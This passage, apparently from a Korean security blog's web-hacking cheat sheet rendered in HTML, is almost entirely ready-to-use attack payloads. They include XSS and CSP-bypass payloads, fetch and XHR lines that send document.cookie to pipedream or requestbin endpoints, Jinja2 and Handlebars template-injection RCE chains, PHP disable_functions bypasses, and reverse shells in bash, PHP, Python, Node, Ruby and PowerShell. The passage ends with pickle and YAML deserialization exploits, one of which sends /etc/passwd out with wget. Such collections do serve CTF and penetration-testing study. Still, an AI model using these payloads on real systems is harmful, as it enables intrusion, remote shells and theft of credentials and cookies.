class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;xss payoad&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;exploit()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;pocas&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://domain/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span> Use an accepted domain<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p>위와 같이 나 자신과 특정(<a href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</p><p><span style="color:#21C587">&#35;</span> Header Injection<br></p><p>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</p><p><span style="color:#21C587">&#35;</span> AngularJS xss<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</p><p><span style="color:#21C587">&#35;</span> CSP Option ↔ Bypass<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://*.google.com;</span><br><span class="line"></span><br><span class="line">&lt;script+src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=(location.href=&#x27;requestbin/?flag=&#x27;+bdocument.cookie);&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Paypal CSP Bypass --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/x-component&quot;</span> <span class="attr">data-component</span>=<span class="string">paypal-checkout</span>&gt;</span></span><br><span class="line"><span class="javascript">  alert(<span class="built_in">document</span>.domain)</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//www.paypalobjects.com/api/checkout.4.0.75.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Javascript-Payload"><a href="#Javascript-Payload" class="headerlink" title=" Javascript Payload"></a><span style="color:#21C587"></span> Javascript Payload<br></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="params">x</span>=&gt;</span>x.text()).then(<span class="function"><span class="params">x</span>=&gt;</span>fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+x));</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;https://pocas.kr&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  headers: &#123;<span class="string">&#x27;headerName&#x27;</span>:<span class="string">&#x27;headerValue&#x27;</span>&#125;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x.text();&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">xx</span>)</span>&#123;fetch(<span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span>+xx)&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span><br><span class="line">x.send();</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20&lt;FILE&gt;`</span>).toString()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 아래 코드는 파일의 이름이 &#x27;T&#x27;로 시작하는 파일을 모두 읽는 코드이다. 만약 읽으려는 파일의 이름이 &#x27;F&#x27;로 시작한다면 &#x27;F\x2a&#x27;를 주면된다.</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><hr><h2 id="Server-Side-Template-Injection"><a href="#Server-Side-Template-Injection" class="headerlink" title=" Server Side Template Injection"></a><span style="color:#21C587"></span> Server Side Template Injection<br></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.<span class="keyword">class</span>.mro()[<span class="number">1</span>].subclasses()&#125;&#125;</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__() &#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.mro()[<span class="number">1</span>].__subclasses__()[<span class="number">396</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request[request.args.param]&#125;&#125;&amp;param=__class__</span><br><span class="line">&#123;&#123;request|attr([request.args.usc*<span class="number">2</span>,request.args.<span class="keyword">class</span>,request.args.usc*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr([<span class="string">&quot;__&quot;</span>,<span class="string">&quot;class&quot;</span>,<span class="string">&quot;__&quot;</span>]|join)&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;request.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;request|attr(request.args.f|<span class="built_in">format</span>(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f=%s%sclass%s%s&amp;a=_</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;\x5f\x5fclass\x5f\x5f&#x27;</span>)|attr(<span class="string">&#x27;\x5f\x5fbase\x5f\x5f’)|attr(‘\x5f\x5fsubclasses\x5f\x5f&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">287</span>)(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>)|attr(<span class="string">&#x27;communicate&#x27;</span>)()|attr(<span class="string">&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;</span>)(<span class="number">0</span>)|attr(<span class="string">&#x27;decode&#x27;</span>)(<span class="string">&#x27;utf-8&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Handlebars Template</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="built_in">JSON</span>.stringify(process.env)&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="built_in">JSON</span>.stringify(process.mainModule.constructor._load(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;ls&quot;</span>))&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Path-Traversal"><a href="#Path-Traversal" class="headerlink" title=" Path Traversal"></a><span style="color:#21C587"></span> Path Traversal<br></h2><p><span style="color:#21C587">&#35;</span><strong> Ubuntu</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;exe</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">package.json</span><br></pre></td></tr></table></figure><hr><h2 id="disable-functions-bypass"><a href="#disable-functions-bypass" class="headerlink" title="disable_functions bypass"></a>disable_functions bypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> pcntl_exec(<span class="string">&#x27;/bin/bash&#x27;</span>,[<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP Version : <span class="number">7.4</span>.X </span><br><span class="line">Condition   : FFI Enable</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$ffi</span>-&gt;system(\<span class="string">&#x27;ls\&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><h2 id="RCE-with-Ruby-YAML-load"><a href="#RCE-with-Ruby-YAML-load" class="headerlink" title="RCE with Ruby YAML.load"></a>RCE with Ruby YAML.load</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output [&#39;ls&#39;]</span><br><span class="line">!!python&#x2F;object&#x2F;apply:subprocess.check_output</span><br><span class="line">       args: [ bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1 ]</span><br><span class="line">       kwds: &#123; shell: true &#125;</span><br><span class="line">!!python&#x2F;object&#x2F;apply:os.system [&quot;wget https:&#x2F;&#x2F;requestbin&#x2F;?&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot;]</span><br></pre></td></tr></table></figure><hr><h2 id="IPv4-to-IP-Decimal-Conversion"><a href="#IPv4-to-IP-Decimal-Conversion" class="headerlink" title="IPv4 to IP Decimal Conversion"></a>IPv4 to IP Decimal Conversion<br></h2><p><a href="https://www.ipaddressguide.com/ip">Link</a></p><hr><h2 id="Create-an-endpoint-or-Connection-redirector"><a href="#Create-an-endpoint-or-Connection-redirector" class="headerlink" title="Create an endpoint or Connection redirector"></a>Create an endpoint or Connection redirector</h2><p><a href="https://bugpoc.com/testers/other/mock">Link (Create an endpoint)</a></p><p><a href="https://bugpoc.com/testers/other/redir">Link (Connection redirector)</a></p><blockquote><p>Example</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Response Headers &gt;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Access-Control-Allow-Origin&quot;:&quot;*&quot;,</span><br><span class="line">  &quot;Content-Type&quot;:&quot;application&#x2F;javascript&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Response Body &gt;</span><br><span class="line">window.parent.alert(1)</span><br><span class="line"></span><br><span class="line">url : https:&#x2F;&#x2F;wv34ypjnazur.redir.bugpoc.ninja</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Response Headers &gt;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Access-Control-Allow-Origin&quot;:&quot;*&quot;,</span><br><span class="line">  &quot;Content-Type&quot;:&quot;application&#x2F;javascript&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Response Body&gt;</span><br><span class="line">window.top.alert(1)</span><br><span class="line"></span><br><span class="line">url : https:&#x2F;&#x2F;p93yp8ell2os.redir.bugpoc.ninja</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Response Headers &gt;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Access-Control-Allow-Origin&quot;:&quot;*&quot;,</span><br><span class="line">  &quot;Content-Type&quot;:&quot;application&#x2F;javascript&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Response Body &gt;</span><br><span class="line">alert(1)</span><br><span class="line"></span><br><span class="line">url : https:&#x2F;&#x2F;nq5h16dpmbg2.redir.bugpoc.ninja</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Response Headers &gt;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Content-Type&quot;:&quot;application&#x2F;javascript&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Response Body &gt;</span><br><span class="line">location.href &#x3D; &quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;f&quot;+document.cookie</span><br><span class="line"></span><br><span class="line">url : https:&#x2F;&#x2F;x6nbuhdfsr89.redir.bugpoc.ninja </span><br></pre></td></tr></table></figure><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/~/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/~</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a><br><br><em>Reference</em> : <a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/~</a><br><br><em>Reference</em> : <a href="https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss">https://portswigger.net/research/~</a><br><br><em>Reference</em> : <a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a><br><br><em>Reference</em> : <a 